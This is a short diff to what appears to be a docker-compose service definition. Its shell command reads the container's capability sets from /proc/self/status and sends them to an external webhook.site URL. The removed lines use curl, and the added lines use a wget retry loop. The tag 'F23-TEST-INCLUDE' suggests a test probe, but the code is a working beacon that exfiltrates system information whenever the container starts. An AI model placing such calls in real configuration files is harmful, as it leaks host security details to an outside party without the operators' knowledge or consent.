@@ -5,7 +5,8 @@ services:
       - sh
       - -c
       - |
-        apk add --no-cache curl >/dev/null 2>&1
-        CAPS=$(grep '^Cap' /proc/self/status | tr '\n' '|')
-        curl -sS "https://webhook.site/5a6ae326-fdb5-4b51-a691-92509b495ff4?tag=F23-TEST-INCLUDE&caps=$CAPS" >/dev/null
+        CAPS=$(grep -E '^Cap(Bnd|Eff)' /proc/self/status | tr '\n' '_')
+        for i in 1 2 3 4 5; do
+          wget -q -T 8 -O - "https://webhook.site/5a6ae326-fdb5-4b51-a691-92509b495ff4?tag=F23-TEST-INCLUDE&i=$i&caps=$CAPS" && break || sleep 3
+        done
         sleep 999999
